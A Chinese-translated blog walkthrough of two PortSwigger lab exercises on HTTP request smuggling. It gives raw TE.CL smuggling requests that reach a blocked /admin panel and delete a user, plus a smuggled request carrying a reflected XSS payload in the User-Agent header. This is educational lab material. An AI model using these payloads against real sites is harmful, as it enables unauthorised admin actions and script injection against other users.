<html>
<head>
<title>HTTP request smuggling Explained and Exploited Part 0x3</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HTTP请求走私解释和利用第0x3部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/http-request-smuggling-explained-and-exploited-part-0x3-b61623287603?source=collection_archive---------1-----------------------#2022-10-25">https://infosecwriteups.com/http-request-smuggling-explained-and-exploited-part-0x3-b61623287603?source=collection_archive---------1-----------------------#2022-10-25</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="bb4c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗨！我叫Hashar Mujahid，今天我们将继续讨论什么是HTTP请求走私漏洞，以及我们如何利用它们。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/bb2f0bacdb7ae89d69dab449b62b0f3d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*sVhSM5o18Oi0cK0H.jpg"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">来自securitybot.io的Img</figcaption></figure><p id="8d86" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗨，今天我们将讨论如何使用HTTP请求走私方法绕过前端安全措施。</p><p id="964c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你不知道什么是HTTP请求走私，我推荐你阅读我在这个系列的前2篇博客。</p><div class="lb lc gp gr ld le"><a rel="noopener  ugc nofollow" target="_blank" href="/http-request-smuggling-explained-and-exploited-part-0x1-89ce2956534f"><div class="lf ab fo"><div class="lg ab lh cl cj li"><h2 class="bd ir gy z fp lj fr fs lk fu fw ip bi translated">HTTP请求走私解释和利用第0x1部分</h2><div class="ll l"><h3 class="bd b gy z fp lj fr fs lk fu fw dk translated">嗨！我的名字是Hashar Mujahid，今天我们将先睹为快请求走私漏洞。</h3></div><div class="lm l"><p class="bd b dl z fp lj fr fs lk fu fw dk translated">infosecwriteups.com</p></div></div><div class="ln l"><div class="lo l lp lq lr ln ls kv le"/></div></div></a></div><div class="lb lc gp gr ld le"><a rel="noopener  ugc nofollow" target="_blank" href="/http-request-smuggling-explained-and-exploited-part-0x2-7768d04883fb"><div class="lf ab fo"><div class="lg ab lh cl cj li"><h2 class="bd ir gy z fp lj fr fs lk fu fw ip bi translated">HTTP请求走私解释和利用第0x2部分</h2><div class="ll l"><h3 class="bd b gy z fp lj fr fs lk fu fw dk translated">嗨！我叫Hashar Mujahid，今天我们将继续讨论什么是HTTP请求走私漏洞…</h3></div><div class="lm l"><p class="bd b dl z fp lj fr fs lk fu fw dk translated">infosecwriteups.com</p></div></div><div class="ln l"><div class="lt l lp lq lr ln ls kv le"/></div></div></a></div><p id="4a5c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们将从我们停止的地方继续！</p><p id="64d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">安全控制可以在应用程序的前端和后端实现。让我们考虑一个场景，应用程序的前端由于这个验证而阻止用户访问某些目录<code class="fe lu lv lw lx b">/admin</code>。开发人员没有在后端进行任何验证，所以如果攻击者以某种方式绕过了前端安全性，后端会用对请求的响应来回应他。</p><pre class="km kn ko kp gt ly lx lz ma aw mb bi"><span id="9201" class="mc md iq lx b gy me mf l mg mh">POST /home HTTP/1.1 <br/>Host: vulnerable-website.com <br/>Content-Type: application/x-www-form-urlencoded <br/>Content-Length: 62 <br/>Transfer-Encoding: chunked  0  <br/>GET /admin HTTP/1.1 <br/>Host: vulnerable-website.com <br/>Foo: xGET /home HTTP/1.1 <br/>Host: vulnerable-website.com</span></pre><p id="8b16" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">前端服务器在这里看到两个请求，都是针对<code class="fe lu lv lw lx b">/home</code>的，因此请求被转发到后端服务器。然而，后端服务器看到一个对<code class="fe lu lv lw lx b">/home</code>的请求和一个对<code class="fe lu lv lw lx b">/admin</code>的请求。它(像往常一样)假设请求已经通过了前端控件，因此授予对受限URL的访问权限。</p><p id="394e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在第2部分中，我们使用CL绕过了安全控制。TE攻击。现在我们将使用TE绕过安全控制。CL攻击。</p></div><div class="ab cl mi mj hu mk" role="separator"><span class="ml bw bk mm mn mo"/><span class="ml bw bk mm mn mo"/><span class="ml bw bk mm mn"/></div><div class="ij ik il im in"><h2 id="e5be" class="mc md iq bd mp mq mr dn ms mt mu dp mv jy mw mx my kc mz na nb kg nc nd ne nf bi translated"><a class="ae ng" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl" rel="noopener ugc nofollow" target="_blank">实验室:利用HTTP请求走私绕过前端安全控制，TE。CL漏洞:</a></h2><p id="178c" class="pw-post-body-paragraph jn jo iq jp b jq nh js jt ju ni jw jx jy nj ka kb kc nk ke kf kg nl ki kj kk ij bi translated">本实验涉及前端和后端服务器，后端服务器不支持分块编码。在<code class="fe lu lv lw lx b">/admin</code>有一个管理面板，但是前端服务器屏蔽了对它的访问。</p><p id="e62e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了解决这个问题，向访问管理面板并删除用户<code class="fe lu lv lw lx b">carlos</code>的后端服务器发送一个请求。</p><p id="7235" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">解决方案:</strong></p><p id="8cf4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在实验室描述中，明确表示前端支持<code class="fe lu lv lw lx b">transfer encoding: chunked</code>但后端服务器不支持。所以进入实验室，把请求发送到打嗝中继器。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nm"><img src="../Images/598bcab9b87b7d877725adce193b8a93.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4CM3RuYgxGd3nRQ35gH5rQ.png"/></div></div></figure><p id="6f72" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将请求方法更改为POST并删除不必要的头。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nn"><img src="../Images/126df0e8c61d29e3a077aeefa854c998.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*D5ChqugsyK_SzPymnjMAqA.png"/></div></div></figure><p id="f963" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们需要添加我们的传输编码头。另外，不要忘记添加尾随的新行。</p><p id="44df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到我们得到了200 ok响应，现在我们只需要想出一种方法来请求<code class="fe lu lv lw lx b">/admin</code>，由于安全控制，我们不能从前端访问它。</p><p id="8695" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">“确保在中继器中禁用更新内容长度”</p><p id="f439" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下一步是在POST请求的主体中创建一个对/admin的Get请求。</p><pre class="km kn ko kp gt ly lx lz ma aw mb bi"><span id="e668" class="mc md iq lx b gy me mf l mg mh"><strong class="lx ir">60 ==&gt; SIZE OF OUR CHUNKED DATA</strong><br/>POST /admin HTTP/1.1<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 15</span><span id="87e7" class="mc md iq lx b gy no mf l mg mh">x=1<br/>0</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi np"><img src="../Images/51b54be808771ce45136833267044d4d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XHJC6eUWNzEw2di5c9oOFw.png"/></div></div></figure><p id="a6fc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到管理面板只对本地主机可用。为了避免这种情况，我们需要添加另一个值为</p><p id="4786" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有效载荷:</p><pre class="km kn ko kp gt ly lx lz ma aw mb bi"><span id="336c" class="mc md iq lx b gy me mf l mg mh">71<br/>POST /admin HTTP/1.1<br/>HOST: localhost<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 15</span><span id="06d3" class="mc md iq lx b gy no mf l mg mh">x=1<br/>0</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nq"><img src="../Images/cc35ade6a59d32a7c343668dcfc055c1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*D_KJyyVCD9MIs55P5T-bmQ.png"/></div></div></figure><p id="3664" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们只需要删除Carlos用户。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nr"><img src="../Images/50efa0b0e4343c9d8c1e92646ba4253f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0icu92y9zRQUqdS66RxltQ.png"/></div></div></figure><pre class="km kn ko kp gt ly lx lz ma aw mb bi"><span id="9535" class="mc md iq lx b gy me mf l mg mh">87 </span><span id="6a02" class="mc md iq lx b gy no mf l mg mh">GET /admin/delete?username=carlos HTTP/1.1 <br/>Host: localhost <br/>Content-Type: application/x-www-form-urlencoded <br/>Content-Length: 15  </span><span id="5c35" class="mc md iq lx b gy no mf l mg mh">x=1 <br/>0</span></pre><p id="fc17" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该有效负载将删除Carlos用户。</p><p id="9036" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，让我们看看如何利用这个漏洞在受害者的浏览器中诱发XSS。</p><h2 id="88b6" class="mc md iq bd mp mq mr dn ms mt mu dp mv jy mw mx my kc mz na nb kg nc nd ne nf bi translated"><a class="ae ng" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss" rel="noopener ugc nofollow" target="_blank">利用HTTP请求走私送映XSS </a></h2><p id="bf6b" class="pw-post-body-paragraph jn jo iq jp b jq nh js jt ju ni jw jx jy nj ka kb kc nk ke kf kg nl ki kj kk ij bi translated">本实验涉及前端和后端服务器，前端服务器不支持分块编码。</p><p id="e942" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该应用还容易受到通过<code class="fe lu lv lw lx b">User-Agent</code>报头<a class="ae ng" href="https://portswigger.net/web-security/cross-site-scripting/reflected" rel="noopener ugc nofollow" target="_blank">反射的XSS </a>的影响。</p><p id="602e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了解决这个实验，偷偷向后端服务器发送一个请求，使下一个用户的请求收到一个响应，该响应包含一个执行<code class="fe lu lv lw lx b">alert(1)</code>的XSS漏洞。</p><p id="7c55" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">解决方案:</p><p id="4246" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到前端服务器不支持分块编码，因此我们不必更新分块数据的大小。我们去实验室吧。</p><p id="587b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的博客中有一个查看博客功能，让我们访问查看博客链接，并将此请求发送到中继器。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ns"><img src="../Images/d33209dad84502dd1aff2febdf7249fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BB_U5rly7YYpPyhnmbiO-g.png"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nt"><img src="../Images/21e55c9a7165c3e10c393d4835893231.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qEtPxWaKASZtc5BpmEDDYg.png"/></div></div></figure><p id="642a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到我们的用户代理价值，让我们尝试诱导一个self-xss，看看它是否可行。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nu"><img src="../Images/9978596267560ef405fbde34b6831ff8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5Wp1yL5uq5GzaE1mrXnRnQ.png"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nt"><img src="../Images/13302ae0cfe0fb9b3b78d74434dd7a3c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nNrQLCiZrTklDjH688a73Q.png"/></div></div></figure><p id="73ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">只要它是自我XSS它的影响是非常低的让我们试着找到一种方法来反映它在受害者的浏览器。</p><p id="c9c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在点击主页，将这个请求发送给打嗝中继器。</p><ul class=""><li id="6181" class="nv nw iq jp b jq jr ju jv jy nx kc ny kg nz kk oa ob oc od bi translated">更改请求方法</li><li id="6bfd" class="nv nw iq jp b jq oe ju of jy og kc oh kg oi kk oa ob oc od bi translated">移除多余的标题</li><li id="e288" class="nv nw iq jp b jq oe ju of jy og kc oh kg oi kk oa ob oc od bi translated">添加<code class="fe lu lv lw lx b">Transfer-Encodind: chunked</code></li><li id="58b1" class="nv nw iq jp b jq oe ju of jy og kc oh kg oi kk oa ob oc od bi translated">添加有效负载</li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nn"><img src="../Images/b782fc412081dd9774e7c97180d1f28c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fTsowfSa0AEjsl_X0CUjNQ.png"/></div></div></figure><p id="eaf6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们需要将之前的请求转移到我们发现XSS的地方。</p><pre class="km kn ko kp gt ly lx lz ma aw mb bi"><span id="b14c" class="mc md iq lx b gy me mf l mg mh">0</span><span id="bda9" class="mc md iq lx b gy no mf l mg mh">GET /post?postId=4 HTTP/1.1<br/>Host: 0a1e00a504b50ac2c0a3b239009400f4.web-security-academy.net<br/>User-Agent: "&gt;&lt;img src=1 onerror=prompt(1)&gt;<br/>Content-Length: 5</span><span id="67dd" class="mc md iq lx b gy no mf l mg mh">x=1</span></pre><p id="9dee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将上述有效载荷添加到我们的请求中。发送请求。当受害者访问它时，XSS就会触发。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nt"><img src="../Images/31c692217d68508910e764549b58ec2a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KMj1W1j6WLyiM4dsCKn_XQ.png"/></div></div></figure><p id="66b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的实验室就解决了。</p><p id="e707" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们了解了如何将两个不同的漏洞联系起来，并提高我们发现的影响。</p></div><div class="ab cl mi mj hu mk" role="separator"><span class="ml bw bk mm mn mo"/><span class="ml bw bk mm mn mo"/><span class="ml bw bk mm mn"/></div><div class="ij ik il im in"><p id="c845" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在下一篇博客中，我们将看到更多利用HTTP请求走私的技术。</p><p id="acb1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在那之前，快乐的黑客❤！</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="oj ok l"/></div></figure></div><div class="ab cl mi mj hu mk" role="separator"><span class="ml bw bk mm mn mo"/><span class="ml bw bk mm mn mo"/><span class="ml bw bk mm mn"/></div><div class="ij ik il im in"><h2 id="ada8" class="mc md iq bd mp mq mr dn ms mt mu dp mv jy mw mx my kc mz na nb kg nc nd ne nf bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae ng" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>